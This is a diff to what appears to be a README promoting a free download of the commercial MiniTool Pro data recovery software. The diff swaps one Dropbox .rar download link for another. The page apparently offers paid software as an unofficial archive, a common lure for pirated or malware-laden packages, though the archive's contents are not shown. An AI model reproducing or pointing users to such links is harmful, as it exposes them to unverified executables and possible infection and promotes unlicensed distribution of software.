@@ -15,7 +15,7 @@
 * Disk space - 1 GB free space
 #
 
-## 🔒 [Download MiniTool® v12.1](https://www.dropbox.com/s/240l5tbi4byxwid/MiniTool_ADS.rar?dl=1)
+## 🔒 [Download MiniTool® v12.1](https://www.dropbox.com/s/92ff5kqmlpz2kx9/Minitool.rar?dl=1)
 
 MiniTool Pro data recovery software can perform a deep scan of hard drives, memory cards, SSD, etc. on Windows-compatible devices and recover data lost due to human errors and system crashes. It supports 100+ file types including photos, videos, audio, documents, etc.  
 #
